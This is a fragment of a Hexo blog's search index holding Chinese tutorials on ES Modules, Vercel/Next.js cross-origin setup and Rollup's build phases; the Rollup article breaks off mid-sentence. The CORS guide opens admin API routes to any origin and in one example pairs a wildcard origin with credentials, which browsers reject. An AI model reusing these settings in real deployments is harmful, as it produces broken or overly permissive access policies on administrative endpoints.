class="name">title</span>&gt;</span>Vite App<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果在 Node.js 环境中，你可以在 package.json 中声明 type: “module” 属性，然后 Node.js 便会默认以 ES Module 规范去解析模块：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// package.json</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;type&quot;</span>: <span class="string">&quot;module&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺便说一句，在 Node.js 中，即使是在 CommonJS 模块里面，也可以通过 import 方法顺利加载 ES 模块，如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">func</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 加载一个 ES 模块</span></span><br><span class="line">  <span class="comment">// 文件名后缀需要是 mjs</span></span><br><span class="line">  <span class="keyword">const</span> &#123; a &#125; = <span class="keyword">await</span> <span class="keyword">import</span>(<span class="string">&quot;./module-a.mjs&quot;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">func</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  func,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ES Module 作为 ECMAScript 官方提出的规范，经过五年多的发展，不仅得到了众多浏览器的原生支持，也在 Node.js 中得到了原生支持，是一个能够跨平台的模块规范。<br />同时，它也是社区各种生态库的发展趋势，尤其是被如今大火的构建工具 Vite 所深度应用。可以说，ES Module 前景一片光明，成为前端大一统的模块标准指日可待。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工程化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vercel部署跨域问题</title>
      <link href="/2024/04/12/frontend/engineering/vercel-bu-shu-kua-yu-wen-ti/"/>
      <url>/2024/04/12/frontend/engineering/vercel-bu-shu-kua-yu-wen-ti/</url>
      
        <content type="html"><![CDATA[<p><a name="cPXwp"></a></p><h2 id="next-js-本地开发环境跨域"><a href="#next-js-本地开发环境跨域" class="headerlink" title="next.js 本地开发环境跨域"></a>next.js 本地开发环境跨域</h2><p><a name="kaFjr"></a></p><h3 id="利用rewrites重写代理"><a href="#利用rewrites重写代理" class="headerlink" title="利用rewrites重写代理"></a>利用<code>rewrites</code>重写代理</h3><p>在<code>next.config.js</code>中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">async rewrites() &#123;</span><br><span class="line">  return [</span><br><span class="line">    //接口请求 前缀带上/admin-api/</span><br><span class="line">    &#123;</span><br><span class="line">      source: &quot;/admin-api/:path*&quot;,</span><br><span class="line">      destination: `$&#123;process.env.NEXT_PUBLIC_NEXT_BASE_URL&#125;/admin-api/:path*`,</span><br><span class="line">    &#125;,</span><br><span class="line">  ];</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><a name="xTulr"></a></p><h3 id="利用headers配置返回头"><a href="#利用headers配置返回头" class="headerlink" title="利用headers配置返回头"></a>利用<code>headers</code>配置返回头</h3><p>在<code>next.config.js</code>中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">const CORS_HEADERS = [</span><br><span class="line">  &#123;</span><br><span class="line">    key: &quot;Access-Control-Allow-Credentials&quot;,</span><br><span class="line">    value: &quot;true&quot;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    key: &quot;Access-Control-Allow-Origin&quot;,</span><br><span class="line">    value: &quot;*&quot;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    key: &quot;Access-Control-Allow-Methods&quot;,</span><br><span class="line">    value: &quot;GET,DELETE,PATCH,POST,PUT&quot;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    key: &quot;Access-Control-Allow-Headers&quot;,</span><br><span class="line">    value: &quot;Content-Type, Authorization&quot;,</span><br><span class="line">  &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">  async headers() &#123;</span><br><span class="line">    // 跨域配置</span><br><span class="line">    return [</span><br><span class="line">      &#123;</span><br><span class="line">        source: &quot;/favicon.ico&quot;,</span><br><span class="line">        headers: [</span><br><span class="line">          &#123;</span><br><span class="line">            key: &quot;Cache-Control&quot;,</span><br><span class="line">            value: &quot;public, max-age=86400&quot;,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        source: &quot;/admin-api/:path*&quot;, // 为访问 /admin-api/** 的请求添加 CORS HTTP Headers</span><br><span class="line">        headers: CORS_HEADERS,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        source: &quot;/specific&quot;, // 为特定路径的请求添加 CORS HTTP Headers,</span><br><span class="line">        headers: CORS_HEADERS,</span><br><span class="line">      &#125;,</span><br><span class="line">    ];</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p><a name="ZzL3J"></a></p><h3 id="利用middleware-js中间件进行跨域设置"><a href="#利用middleware-js中间件进行跨域设置" class="headerlink" title="利用middleware.js中间件进行跨域设置"></a>利用<code>middleware.js</code>中间件进行跨域设置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// middleware.js</span><br><span class="line"></span><br><span class="line">import &#123; NextResponse &#125; from &quot;next/server&quot;;</span><br><span class="line"></span><br><span class="line">export const config = &#123;</span><br><span class="line">  // matcher: &#x27;/:lng*&#x27;</span><br><span class="line">  matcher: [</span><br><span class="line">    &quot;/((?!api|admin-api|_next/static|_next/image|assets|favicon.ico|sw.js).*)&quot;,</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">export function middleware(req) &#123;</span><br><span class="line">  const response = NextResponse.next();</span><br><span class="line"></span><br><span class="line">  // 设置 CORS 策略</span><br><span class="line">  response.headers.set(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);</span><br><span class="line">  response.headers.set(</span><br><span class="line">    &quot;Access-Control-Allow-Methods&quot;,</span><br><span class="line">    &quot;GET, POST, PUT, DELETE, OPTIONS&quot;</span><br><span class="line">  );</span><br><span class="line">  response.headers.set(</span><br><span class="line">    &quot;Access-Control-Allow-Headers&quot;,</span><br><span class="line">    &quot;Content-Type, Authorization&quot;</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  return response;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="xLNFJ"></a></p><h2 id="在服务器环境中跨域，例如-vercel"><a href="#在服务器环境中跨域，例如-vercel" class="headerlink" title="在服务器环境中跨域，例如 vercel"></a>在服务器环境中跨域，例如 vercel</h2><p>新建<code>vercel.json</code>的配置文件</p><p><a name="UhujO"></a></p><h3 id="利用route路由配置"><a href="#利用route路由配置" class="headerlink" title="利用route路由配置"></a>利用<code>route</code>路由配置</h3><p>在<code>next.config.js</code>中：<br /><code>&quot;src&quot;: &quot;/admin-api/*&quot;</code>表示访问<code>/admin-api</code>开头的页面应用下面的规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;routes&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;src&quot;: &quot;/admin-api/*&quot;,</span><br><span class="line">      &quot;methods&quot;: [&quot;GET&quot;, &quot;POST&quot;, &quot;PUT&quot;, &quot;DELETE&quot;],</span><br><span class="line">      &quot;headers&quot;: &#123;</span><br><span class="line">        &quot;Access-Control-Allow-Origin&quot;: &quot;*&quot;,</span><br><span class="line">        &quot;Access-Control-Allow-Methods&quot;: &quot;GET, POST, PUT, DELETE&quot;,</span><br><span class="line">        &quot;Access-Control-Allow-Headers&quot;: &quot;Content-Type, Authorization&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="etjXZ"></a></p><h3 id="利用rewrites配置重写请求路径"><a href="#利用rewrites配置重写请求路径" class="headerlink" title="利用rewrites配置重写请求路径"></a>利用<code>rewrites</code>配置重写请求路径</h3><p><a name="x5Fup"></a></p><h4 id="配置next-config-js："><a href="#配置next-config-js：" class="headerlink" title="配置next.config.js："></a>配置<code>next.config.js</code>：</h4><p>访问<code>/admin-api/</code>的请求会去执行根目录下<code>api</code>文件夹中的<code>proxy.js</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;rewrites&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;source&quot;: &quot;/admin-api/(.*)&quot;,</span><br><span class="line">      &quot;destination&quot;: &quot;/api/proxy&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="ohhRC"></a></p><h4 id="在api文件夹下创建proxy-js文件："><a href="#在api文件夹下创建proxy-js文件：" class="headerlink" title="在api文件夹下创建proxy.js文件："></a>在<code>api</code>文件夹下创建<code>proxy.js</code>文件：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// 该服务为 vercel serve跨域处理</span><br><span class="line">const &#123; createProxyMiddleware &#125; = require(&quot;http-proxy-middleware&quot;);</span><br><span class="line">module.exports = (req, res) =&gt; &#123;</span><br><span class="line">  let target = &quot;&quot;;</span><br><span class="line">  // 代理目标地址</span><br><span class="line">  // xxxxx 替换为你跨域请求的服务器 如： http://baidu.com</span><br><span class="line">  if (req.url.startsWith(&quot;/admin-api&quot;)) &#123;</span><br><span class="line">    //这里使用/admin-api serverless 的 admin-api 路径冲突，根据接口进行调整</span><br><span class="line">    target = &quot;http://222.71.83.59:48080&quot;; //这里就是在vite中配置的一样</span><br><span class="line">  &#125;</span><br><span class="line">  // 创建代理对象并转发请求</span><br><span class="line">  createProxyMiddleware(&#123;</span><br><span class="line">    target,</span><br><span class="line">    changeOrigin: true,</span><br><span class="line">    pathRewrite: &#123;</span><br><span class="line">      // 通过路径重写，去除请求路径中的 `/admin-api`</span><br><span class="line">      &quot;^/admin-api/&quot;: &quot;/&quot;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)(req, res);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="EmEVT"></a></p><h4 id="在-vercel-https-vercel-com-控制台中查看proxy-js的执行情况"><a href="#在-vercel-https-vercel-com-控制台中查看proxy-js的执行情况" class="headerlink" title="在[vercel](https://vercel.com/)控制台中查看proxy.js的执行情况"></a>在<code>[vercel](https://vercel.com/)</code>控制台中查看<code>proxy.js</code>的执行情况</h4><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1712716479473-e2decadc-ce66-4b7f-b0af-fc43c345d5a8.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1712716479473-e2decadc-ce66-4b7f-b0af-fc43c345d5a8.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p>注意：<br />根据 <code>next.js</code><a href="https://nextjs.org/docs">官方文档</a> ，<code>vercel.json</code>文件中不能同时配置<code>rewrites</code>和<code>headers</code>以及<code>routes</code>，否则会导致 Git 自动部署失败的问题</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工程化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rollup 打包原理与插件</title>
      <link href="/2024/04/01/frontend/engineering/rollup-da-bao-yuan-li-yu-cha-jian/"/>
      <url>/2024/04/01/frontend/engineering/rollup-da-bao-yuan-li-yu-cha-jian/</url>
      
        <content type="html"><![CDATA[<p><a name="zENZK"></a></p><h2 id="插件机制"><a href="#插件机制" class="headerlink" title="插件机制"></a>插件机制</h2><p>仅仅使用 Rollup 内置的打包能力很难满足项目日益复杂的构建需求。对于一个真实的项目构建场景来说，我们还需要考虑到模块打包之外的问题，比如<strong>路径别名(alias)</strong> 、<strong>全局变量注入</strong>和<strong>代码压缩</strong>等等。<br />可要是把这些场景的处理逻辑与核心的打包逻辑都写到一起，一来打包器本身的代码会变得十分臃肿，二来也会对原有的核心代码产生一定的侵入性，混入很多与核心流程无关的代码，不易于后期的维护。<br />因此，Rollup 设计出了一套完整的<strong>插件机制</strong>，将自身的核心逻辑与插件逻辑分离，让你能按需引入插件功能，提高了 Rollup 自身的可扩展性。体现了 Rollup 本身小而美的风格。</p><p>Rollup 的打包过程中，会定义一套完整的构建生命周期，从开始打包到产物输出，中途会经历一些<strong>标志性的阶段</strong>，并且在不同阶段会自动执行对应的插件钩子函数 Hook。<br />对 Rollup 插件来讲，最重要的部分是钩子函数，一方面它定义了插件的执行逻辑，也就是 **”做什么”**；另一方面也声明了插件的作用阶段，即 **”什么时候做”**，这与 Rollup 本身的构建生命周期息息相关。<br><a name="v22xR"></a></p><h3 id="Rollup-整体构建阶段"><a href="#Rollup-整体构建阶段" class="headerlink" title="Rollup 整体构建阶段"></a>Rollup 整体构建阶段</h3><p>要真正理解插件的作用范围和阶段，首先需要了解 Rollup 整体的构建过程中到底做了些什么。</p><p>在执行 rollup 命令之后，在 cli 内部的主要逻辑简化如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Build 阶段</span></span><br><span class="line"><span class="keyword">const</span> bundle = <span class="keyword">await</span> rollup.<span class="title function_">rollup</span>(inputOptions);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Output 阶段</span></span><br><span class="line"><span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(outputOptions.<span class="title function_">map</span>(bundle.<span class="property">write</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建结束</span></span><br><span class="line"><span class="keyword">await</span> bundle.<span class="title function_">close</span>();</span><br></pre></td></tr></table></figure><p>Rollup 内部主要经历了 <strong>Build</strong> 和 <strong>Output</strong> 两大阶段<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695039798470-c6d7cf65-1e2f-4431-bc89-4d49e24a89f1.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695039798470-c6d7cf65-1e2f-4431-bc89-4d49e24a89f1.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="bUnJf"></a></p><h4 id="Build-阶段"><a href="#Build-阶段" class="headerlink" title="Build 阶段"></a>Build 阶段</h4><p>首先，<strong>Build 阶段主要负责创建模块依赖图，初始化各个模块的 AST 以及模块之间的依赖关系。</strong><br />下面我们用一个简单的例子来感受一下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/index.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; a &#125; <span class="keyword">from</span> <span class="string">&#x27;./module-a&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="comment">// src/module-a.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> a = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>然后执行如下的构建脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> rollup = <span class="built_in">require</span>(<span class="string">&#x27;rollup&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>);</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> bundle = <span class="keyword">await</span> rollup.<span class="title function_">rollup</span>(&#123;</span><br><span class="line">    <span class="attr">input</span>: [<span class="string">&#x27;./src/index.js&#x27;</span>],</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(bundle));</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">build</span>();</span><br></pre></td></tr></table></figure><p>可以看到这样的 bundle 对象信息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">cache</span>: &#123;</span><br><span class="line">    <span class="attr">modules</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">ast</span>: <span class="string">&#x27;AST 节点信息，具体内容省略&#x27;</span>,</span><br><span class="line">        <span class="attr">code</span>: <span class="string">&#x27;export const a = 1;&#x27;</span>,</span><br><span class="line">        <span class="attr">dependencies</span>: [],</span><br><span class="line">        <span class="attr">id</span>: <span class="string">&#x27;/Users/code/rollup-demo/src/data.js&#x27;</span>,</span><br><span class="line">        <span class="comment">// 其它属性省略</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">ast</span>: <span class="string">&#x27;AST 节点信息，具体内容省略&#x27;</span>,</span><br><span class="line">        <span class="attr">code</span>: <span class="string">&quot;import &#123; a &#125; from &#x27;./data&#x27;;\n\nconsole.log(a);&quot;</span>,</span><br><span class="line">        <span class="attr">dependencies</span>: [</span><br><span class="line">          <span class="string">&#x27;/Users/code/rollup-demo/src/data.js&#x27;</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">id</span>: <span class="string">&#x27;/Users/code/rollup-demo/src/index.js&#x27;</span>,</span><br><span class="line">        <span class="comment">// 其它属性省略</span></span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">plugins</span>: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">closed</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="comment">// 挂载后续阶段会执行的方法</span></span><br><span class="line">  <span class="attr">close</span>: [<span class="title class_">AsyncFunction</span>: close],</span><br><span class="line">  <span class="attr">generate</span>: [<span class="title class_">AsyncFunction</span>: generate],</span><br><span class="line">  <span class="attr">write</span>: [<span class="title class_">AsyncFunction</span>: write]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面的信息中可以看出，目前经过 Build 阶段的 bundle 对象其实并没有进行模块的打包，<strong>这个对象的作用在于存储各个模块的内容及依赖关系，同时暴露 write 和 generate 方法</strong>，用以进入到后续的 Output 阶段</p><blockquote><p>write 和 generate 方法唯一的区别在于前者打包完产物会写入磁盘，而后者不会。</p></blockquote><p><a name="VLozO"></a></p><h4 id="Output-阶段"><a href="#Output-阶段" class="headerlink" title="Output 阶段"></a>Output 阶段</h4><p>真正进行打包的过程会在 Output 阶段进行，即在 bundle 对象的 write 或 generate 方法中进行。</p><p>还是以上面的 demo 为例，我们稍稍改动一下构建逻辑：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> rollup = <span class="built_in">require</span>(<span class="string">&#x27;rollup&#x27;</span>);</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> bundle = <span class="keyword">await</span> rollup.<span class="title function_">rollup</span>(&#123;</span><br><span class="line">    <span class="attr">input</span>: [<span class="string">&#x27;./src/index.js&#x27;</span>],</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">await</span> bundle.<span class="title function_">generate</span>(&#123;</span><br><span class="line">    <span class="attr">format</span>: <span class="string">&#x27;es&#x27;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;result:&#x27;</span>, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">build</span>();</span><br></pre></td></tr></table></figure><p>执行后可以得到如下的输出：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">output</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">exports</span>: [],</span><br><span class="line">      <span class="attr">facadeModuleId</span>: <span class="string">&#x27;/Users/code/rollup-demo/src/index.js&#x27;</span>,</span><br><span class="line">      <span class="attr">isEntry</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">isImplicitEntry</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&#x27;chunk&#x27;</span>,</span><br><span class="line">      <span class="attr">code</span>: <span class="string">&#x27;const a = 1;\n\nconsole.log(a);\n&#x27;</span>,</span><br><span class="line">      <span class="attr">dynamicImports</span>: [],</span><br><span class="line">      <span class="attr">fileName</span>: <span class="string">&#x27;index.js&#x27;</span>,</span><br><span class="line">      <span class="comment">// 其余属性省略</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看到，生成的 output 数组即为打包完成的结果。<br />当然，如果<strong>使用 bundle.write 会根据配置将最后的产物写入到指定的磁盘目录中</strong>。</p><p>因此，<strong>对于一次完整的构建过程而言，Rollup 会先进入到 Build 阶段，解析各模块的内容及依赖关系，然后进入 Output</strong> <strong>阶段，完成打包及输出的过程</strong>。</p><p>对于不同的阶段，Rollup 插件会有不同的插件工作流程，接下来我们就来拆解一下 Rollup 插件在 Build 和 Output 两个阶段的详细工作流程。</p><p><a name="Kyrjo"></a></p><h3 id="拆解插件工作流"><a href="#拆解插件工作流" class="headerlink" title="拆解插件工作流"></a>拆解插件工作流</h3><p><a name="vE4qa"></a></p><h4 id="插件-Hook-的类型"><a href="#插件-Hook-的类型" class="headerlink" title="插件 Hook 的类型"></a>插件 Hook 的类型</h4><p>首先需要了解不同插件 Hook 的类型，这些类型代表了不同插件的执行特点，是我们理解 Rollup 插件工作流的基础。</p><p>所以 Build 和 Output 这两个阶段到底跟插件机制有什么关系呢？<br />实际上，插件的各种 Hook 可以根据这两个构建阶段分为两类：<strong>Build Hook</strong> 与 <strong>Output Hook</strong>。</p><ol><li>Build Hook 即在 Build 阶段执行的钩子函数，在这个阶段主要进行模块代码的转换、AST 解析以及模块依赖的解析，那么<strong>这个阶段的 Hook 对于代码的操作粒度一般为模块 